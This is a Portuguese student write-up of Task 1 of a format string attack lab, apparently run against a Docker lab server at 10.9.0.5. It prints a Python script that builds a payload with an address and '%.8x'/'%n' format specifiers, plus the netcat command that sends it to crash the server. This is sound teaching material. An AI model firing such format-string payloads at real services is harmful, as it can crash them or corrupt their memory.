# Semana 7 - Format String Attack

## Task 1

Depois de dar setup deste lab e com o servidor pronto para receber uma mensagem, através do docker, temos como missão crashar o servidor.<br>
Para tal como é referido no guião, o servidor aguenta até 1500 bytes de dados, portanto, para o servidor crashar, precisamos de escrever mais de 1500 bytes de dados para o servidor.<br>
Para fazer isso criamos um ficheiro `badfile` que irá conter a mensagem para enviar para o servidor, e utilizamos o `build_string.py` que contém um script em python para escrever a mensagem para o ficheiro `badfile`.

O `build_string.py` contém o seguinte código:

```py
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1501
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0xbfffeeee
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with 12 of "%.8x", concatenated with a "%n"
s = "%.8x"*12 + "%n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

Com o ficheiro pronto para ser enviado, basta enviar a mensagem para o servidor, através do seguinte comando:

`cat badfile | nc 10.9.0.5 9090`

Com isto, o servidor não respondeu com **(^/_^)(^/_^)  Returned properly (^/_^)(^/_^)**, o que significa que crashou.

